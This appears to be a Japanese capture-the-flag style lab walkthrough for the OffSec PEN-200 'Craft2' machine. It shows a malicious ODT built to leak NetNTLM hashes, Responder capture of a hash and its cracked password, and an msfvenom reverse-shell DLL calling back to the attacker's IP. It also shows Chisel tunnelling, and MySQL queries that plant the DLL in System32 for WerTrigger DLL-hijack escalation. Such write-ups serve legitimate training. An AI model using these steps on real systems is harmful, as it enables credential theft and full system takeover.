![[wt image 180.png]]

![[wt image 181.png]]

![[wt image 182.png]]

![[wt image 183.png]]

ODTファイルの作成

https://github.com/rmdavy/badodf/blob/master/badodt.py

![[wt image 184.png]]

bad.odtファイルの作成

┌──(kali㉿kali)-\[~/…/PEN-200_OSCP+/Lab/Windows/Craft2\]

└─$ source venv/bin/activate

┌──(venv)─(kali㉿kali)-\[~/…/PEN-200_OSCP+/Lab/Windows/Craft2\]

└─$ python3 badodt.py

/home/kali/OffSec/PEN-200_OSCP+/Lab/Windows/Craft2/badodt.py:13: SyntaxWarning: invalid escape sequence '\/'

/ __ )____ _____/ /     / __ \/ __ \/ ____/

____            __      ____  ____  ______

/ __ )____ _____/ /     / __ \/ __ \/ ____/

/ __  / __ \`/ __  /_____/ / / / / / / /_

/ /_/ / /_/ / /_/ /_____/ /_/ / /_/ / __/

/_____/\__,_/\__,_/      \____/_____/_/

Create a malicious ODF document help leak NetNTLM Creds

By Richard Davy

@rd_pentest

Python3 version by @gustanini

www.secureyourit.co.uk

Please enter IP of listener: 192.168.45.218

/home/kali/OffSec/PEN-200_OSCP+/Lab/Windows/Craft2/bad.odt successfully created

![[wt image 185.png]]

smbサーバーの待ち受け

└─$ sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py temp $(pwd) -smb2support

![[wt image 186.png]]

※これはうまく受信できなかったため、Responderに切り替え

└─$ sudo responder -I tun0

![[wt image 187.png]]

![[wt image 188.png]]

thecybergeek::CRAFT2:60f46e5174839f84:A42E88575DCF88DE4E3BF1F8FA75DCAC:010100000000000080BF8B4A2C85DC016BEB90CC27CFBBA60000000002000800520056003200590001001E00570049004E002D0031005A00330032004F0030003200450036004F004D0004003400570049004E002D0031005A00330032004F0030003200450036004F004D002E0052005600320059002E004C004F00430041004C000300140052005600320059002E004C004F00430041004C000500140052005600320059002E004C004F00430041004C000700080080BF8B4A2C85DC0106000400020000000800300030000000000000000000000000300000CC0138A695F108F7A308F99F4D3F33A4267464CF03A9B699EAF3B754930C64410A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00340035002E003200310038000000000000000000

![[wt image 189.png]]

winniethepooh    (thecybergeek)

![[wt image 190.png]]

![[wt image 191.png]]

![[wt image 192.png]]

![[wt image 193.png]]

![[wt image 194.png]]

Enum for PE

Hotfixes

![[wt image 195.png]]

Users

![[wt image 196.png]]

PE

dll hyjacking

https://github.com/sailay1996/WerTrigger

WerTrigger.exeとReport.werファイルのみダウンロードしたものを使用し、phoneinfo.dllは自作する

└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.218 LPORT=139 -f dll > phoneinfo.dll

![[wt image 197.png]]

└─$ smbclient //192.168.229.188/WebApp -U thecybergeek

winniethepooh

![[wt image 198.png]]

Chiselでローカルポートのphpmyadminにアクセスする（Chisel用のshellが必要）

![[wt image 199.png]]

.\chisel.exe client 192.168.45.218:8050 R:8080:127.0.0.1:80

![[wt image 200.png]]

アップロードしたファイルをシステム権限で動いているmysqlの権限を利用して、C:\Windows\System32\に書き込む

select load_file('C:\\xampp\\htdocs\\phoneinfo.dll') into dumpfile 'C:\\Windows\\system32\\phoneinfo.dll';

select load_file('C:\\xampp\\htdocs\\Report.wer') into dumpfile 'C:\\Windows\\system32\\Report.wer';

select load_file('C:\\xampp\\htdocs\\WerTrigger.exe') into dumpfile 'C:\\Windows\\system32\\WerTrigger.exe';

![[wt image 201.png]]

![[wt image 202.png]]

クエリを実行後WerTrigger.exeを実行する

![[wt image 203.png]]

結果は失敗したように見えるが、ReverseShellは実行されている

![[wt image 204.png]]

![[wt image 205.png]]